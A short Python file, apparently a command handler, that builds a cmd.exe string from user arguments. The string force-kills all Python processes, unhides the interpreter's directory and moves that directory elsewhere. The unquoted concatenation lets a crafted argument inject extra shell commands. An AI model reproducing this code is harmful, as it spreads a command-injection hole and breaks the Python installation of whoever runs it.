import sys, os
class Change_Dir():
	def __init__(self, _):
		self.new_dir = " ".join(_.args)
		self.Main()
	def Main(self):
		dirname = os.path.dirname(sys.executable)
		os.system("cmd.exe /c taskkill /IM python.exe /F & attrib -s -h " + dirname + " & move " + dirname + " " + self.new_dir)
